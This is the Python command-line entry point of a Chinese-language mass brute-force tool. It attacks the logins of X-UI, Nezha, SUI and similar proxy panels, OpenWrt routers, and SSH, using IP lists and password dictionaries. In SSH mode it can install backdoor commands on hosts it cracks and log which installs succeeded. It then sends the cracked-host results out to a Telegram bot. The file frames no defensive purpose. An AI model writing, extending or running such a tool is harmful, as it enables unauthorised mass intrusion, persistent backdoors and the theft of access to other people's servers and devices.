"""X-UI 混合爆破工具 —— 命令行入口.

支持：
  1. 纯环境变量：XUI_MODE=1 XUI_INPUT_FILE=ips.txt python main.py
  2. 命令行参数：python main.py -m 1 -i ips.txt -t 500
  3. 交互式：python main.py（无参数无环境变量时）
"""

import argparse
import os
import sys
import time
from datetime import datetime, timedelta, timezone
from pathlib import Path

from . import config as cfg
from .models import build_panel_modes
from .generators import generate_for_mode
from .environment import setup_environment
from .ip_query import generate_ipcx_script
from .runner import (
    ensure_temp_dirs,
    prepare_and_split,
    split_input_file,
    run_go_for_parts,
    merge_xui_files,
    merge_result_files,
    run_ipcx_script,
    cleanup_temp_files,
)
from .telegram import upload_results


def select_mode_interactive() -> int:
    """交互式选择爆破模式."""
    print("请选择爆破模式：")
    print("1.XUI面板爆破  2.哪吒面板爆破")
    print("3.HUI面板爆破  4.咸蛋面板爆破")
    print("5.SUI面板爆破  6.SSH爆破")
    print("7.Sub Store爆破  8.OpenWrt/iStoreOS爆破")
    while True:
        choice = input("输入 1、2、3、4、5、6、7 或 8（默认1）：").strip()
        if choice in ("", "1"):
            return 1
        elif choice in ("2", "3", "4", "5", "6", "7", "8"):
            return int(choice)
        else:
            print("输入无效，请重新输入。")


def load_custom_credentials(mode_id: int, use_custom: bool):
    """加载自定义用户名/密码字典."""
    if not use_custom:
        return None, None

    user_file = cfg.USERNAME_FILE or "username.txt"
    pass_file = cfg.PASSWORD_FILE or "password.txt"

    if mode_id == 7:
        if not os.path.exists(pass_file):
            print(f"缺少 {pass_file} 文件")
            sys.exit(1)
        return None, Path(pass_file).read_text(encoding="utf-8").splitlines()

    if not os.path.exists(user_file) or not os.path.exists(pass_file):
        print(f"缺少 {user_file} 或 {pass_file} 文件")
        sys.exit(1)

    usernames = Path(user_file).read_text(encoding="utf-8").splitlines()
    passwords = Path(pass_file).read_text(encoding="utf-8").splitlines()
    return usernames, passwords


def rename_outputs(mode_id: int, time_str: str) -> str:
    """重命名输出文件并返回主结果文件名."""
    prefix = cfg.OUTPUT_PREFIX[mode_id]
    final_result = None

    if os.path.exists("xui.txt"):
        final_result = f"{prefix}-{time_str}.txt"
        os.rename("xui.txt", final_result)

    if os.path.exists("xui.xlsx"):
        os.rename("xui.xlsx", f"{prefix}-{time_str}.xlsx")

    if os.path.exists("hmsuccess.txt"):
        os.rename("hmsuccess.txt", f"后门安装成功-{time_str}.txt")

    if os.path.exists("hmfail.txt"):
        os.rename("hmfail.txt", f"后门安装失败-{time_str}.txt")

    return final_result


def run_interactive():
    """交互式运行（兼容旧版行为）."""
    mode_id = select_mode_interactive()

    install_backdoor = False
    backdoor_cmds = []
    if mode_id == 6:
        choice = input(
            f"是否在SSH爆破成功后自动安装后门，后门命令需存放在（{cfg.BACKDOOR_CMD_FILE}）？(y/N)："
        ).strip().lower()
        if choice == "y":
            install_backdoor = True
            if not os.path.exists(cfg.BACKDOOR_CMD_FILE):
                print(f"❌ 未找到 {cfg.BACKDOOR_CMD_FILE}")
                sys.exit(1)
            backdoor_cmds = [
                line.strip()
                for line in Path(cfg.BACKDOOR_CMD_FILE).read_text(encoding="utf-8").splitlines()
                if line.strip()
            ]

    mode_temp = build_panel_modes(mode_id, install_backdoor=install_backdoor)
    setup_environment(mode_temp.extra_go_packages)

    print("=== 爆破一键启动 ===")
    input_file = input(f"请输入源文件名（默认 {cfg.INPUT_FILE}）：").strip() or cfg.INPUT_FILE
    if not os.path.exists(input_file):
        print("文件不存在")
        sys.exit(1)

    lines_per_file = _input_int("每个小文件行数", cfg.LINES_PER_FILE)
    sleep_seconds = _input_int("爆破完休息秒数", cfg.SLEEP_SECONDS)
    threads = _input_int("爆破线程数", cfg.THREADS)
    batch_size = _input_int("每批次数量", cfg.BATCH_SIZE)

    if mode_id == 7:
        use_custom = input("是否使用 password.txt 路径库？(y/N)：").strip().lower() == "y"
    else:
        use_custom = input(
            "是否使用 username.txt / password.txt 字典库？(y/N)："
        ).strip().lower() == "y"

    custom_users, custom_passes = load_custom_credentials(mode_id, use_custom)

    mode = build_panel_modes(
        mode_id,
        custom_usernames=custom_users,
        custom_passwords=custom_passes,
        install_backdoor=install_backdoor,
        backdoor_cmds=backdoor_cmds,
    )

    run_workflow(mode, input_file, lines_per_file, sleep_seconds, threads, batch_size)


def run_workflow(mode, input_file, lines_per_file, sleep_seconds, threads, batch_size):
    """执行完整爆破工作流."""
    start = time.time()
    interrupted = False
    final_result_file = None

    try:
        print(f">>> 生成 {mode.name} 爆破代码 ...")
        generate_for_mode(
            mode_id=mode.mode_id,
            semaphore_size=threads,
            batch_size=batch_size,
            usernames=mode.default_usernames,
            passwords=mode.default_passwords,
            enable_backdoor=mode.enable_backdoor,
            backdoor_cmds=mode.custom_backdoor_cmds,
        )

        generate_ipcx_script()
        ensure_temp_dirs()

        # 归一化 + 分片（默认开启 CIDR 展开和 URL 提取）
        total = prepare_and_split(input_file, lines_per_file)
        print(f"    共 {total} 个目标，分为 {max(1, (total + lines_per_file - 1) // lines_per_file)} 个分片")
        print()
        run_go_for_parts(sleep_seconds)

        merge_xui_files()
        merge_result_files("hmsuccess", "hmsuccess.txt", cfg.TEMP_HMSUCCESS_DIR)
        merge_result_files("hmfail", "hmfail.txt", cfg.TEMP_HMFAIL_DIR)

        if not cfg.NO_EXCEL and mode.enable_excel:
            run_ipcx_script()

        beijing_time = datetime.utcnow().replace(tzinfo=timezone.utc) + timedelta(hours=8)
        time_str = beijing_time.strftime("%Y%m%d-%H%M")
        final_result_file = rename_outputs(mode.mode_id, time_str)

        if cfg.TELEGRAM_BOT_TOKEN and cfg.TELEGRAM_CHAT_ID and final_result_file:
            hmsuccess = f"后门安装成功-{time_str}.txt" if mode.is_ssh_mode else None
            hmfail = f"后门安装失败-{time_str}.txt" if mode.is_ssh_mode else None
            upload_results(
                final_result_file,
                cfg.TELEGRAM_BOT_TOKEN,
                cfg.TELEGRAM_CHAT_ID,
                also_xlsx=mode.enable_excel,
                also_hmsuccess=hmsuccess,
                also_hmfail=hmfail,
            )
        elif final_result_file:
            print("\n💡 提示：设置 TG_BOT_TOKEN / TG_CHAT_ID 环境变量可自动上传 Telegram")

    except KeyboardInterrupt:
        print("\n>>> 用户中断操作（Ctrl+C），准备清理临时文件...")
        interrupted = True
    finally:
        cleanup_temp_files()
        cost = int(time.time() - start)
        if interrupted:
            print(f"\n=== 已中断，共运行 {cost // 60} 分 {cost % 60} 秒 ===")
        else:
            print(f"\n=== 全部完成！总用时 {cost // 60} 分 {cost % 60} 秒 ===")
            if final_result_file:
                print(f"📄 结果文件: {final_result_file}")


def _input_int(prompt: str, default: int) -> int:
    val = input(f"{prompt}（默认 {default}）：").strip()
    return int(val) if val.isdigit() else default


# ── argparse CLI ──────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="xui",
        description="X-UI 混合爆破工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
环境变量（优先级高于默认值，低于命令行参数）:
  XUI_MODE, XUI_INPUT_FILE, XUI_LINES_PER_FILE, XUI_SLEEP_SECONDS,
  XUI_THREADS, XUI_BATCH_SIZE, XUI_USERNAME_FILE, XUI_PASSWORD_FILE,
  XUI_BACKDOOR, XUI_BACKDOOR_CMD_FILE, XUI_NO_EXCEL,
  TG_BOT_TOKEN, TG_CHAT_ID

当前环境变量配置:
{chr(10).join(f'  {k}={v}' for k, v in cfg.dump().items())}

使用示例:
  python main.py -m 1 -i ips.txt
  XUI_MODE=6 XUI_BACKDOOR=true python main.py -i ssh.txt
        """,
    )
    parser.add_argument("-m", "--mode", type=int, choices=range(1, 9), default=cfg.MODE or None)
    parser.add_argument("-i", "--input", type=str, default=cfg.INPUT_FILE)
    parser.add_argument("-U", "--username-file", type=str, default=cfg.USERNAME_FILE or None)
    parser.add_argument("-P", "--password-file", type=str, default=cfg.PASSWORD_FILE or None)
    parser.add_argument("--backdoor", action="store_true", default=cfg.ENABLE_BACKDOOR)
    parser.add_argument("--backdoor-cmd-file", type=str, default=cfg.BACKDOOR_CMD_FILE)
    parser.add_argument("-L", "--lines", type=int, default=cfg.LINES_PER_FILE)
    parser.add_argument("-s", "--sleep", type=int, default=cfg.SLEEP_SECONDS)
    parser.add_argument("-t", "--threads", type=int, default=cfg.THREADS)
    parser.add_argument("-b", "--batch", type=int, default=cfg.BATCH_SIZE)
    parser.add_argument("--no-excel", action="store_true", default=cfg.NO_EXCEL)
    parser.add_argument("--tg-token", type=str, default=cfg.TELEGRAM_BOT_TOKEN or None)
    parser.add_argument("--tg-chat-id", type=str, default=cfg.TELEGRAM_CHAT_ID or None)
    return parser


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)

    # 命令行的 Telegram 设置覆盖环境变量
    if args.tg_token:
        os.environ["TG_BOT_TOKEN"] = args.tg_token
        cfg.TELEGRAM_BOT_TOKEN = args.tg_token
    if args.tg_chat_id:
        os.environ["TG_CHAT_ID"] = args.tg_chat_id
        cfg.TELEGRAM_CHAT_ID = args.tg_chat_id

    # 未指定 mode → 交互式
    if args.mode is None or args.mode == 0:
        run_interactive()
        return

    mode_id = args.mode
    input_file = args.input
    if not os.path.exists(input_file):
        print(f"❌ 输入文件不存在: {input_file}")
        sys.exit(1)

    # 加载自定义凭据
    custom_usernames = None
    custom_passwords = None
    if args.username_file:
        if not os.path.exists(args.username_file):
            print(f"❌ 用户名字典不存在: {args.username_file}")
            sys.exit(1)
        custom_usernames = Path(args.username_file).read_text(encoding="utf-8").splitlines()
    if args.password_file:
        if not os.path.exists(args.password_file):
            print(f"❌ 密码字典不存在: {args.password_file}")
            sys.exit(1)
        custom_passwords = Path(args.password_file).read_text(encoding="utf-8").splitlines()

    # 后门配置
    install_backdoor = args.backdoor and mode_id == 6
    backdoor_cmds = []
    if install_backdoor:
        if not os.path.exists(args.backdoor_cmd_file):
            print(f"❌ 后门命令文件不存在: {args.backdoor_cmd_file}")
            sys.exit(1)
        backdoor_cmds = [
            line.strip()
            for line in Path(args.backdoor_cmd_file).read_text(encoding="utf-8").splitlines()
            if line.strip()
        ]

    mode = build_panel_modes(
        mode_id,
        custom_usernames=custom_usernames,
        custom_passwords=custom_passwords,
        install_backdoor=install_backdoor,
        backdoor_cmds=backdoor_cmds,
    )

    setup_environment(mode.extra_go_packages)

    run_workflow(
        mode, input_file,
        args.lines, args.sleep, args.threads, args.batch,
    )


if __name__ == "__main__":
    main()
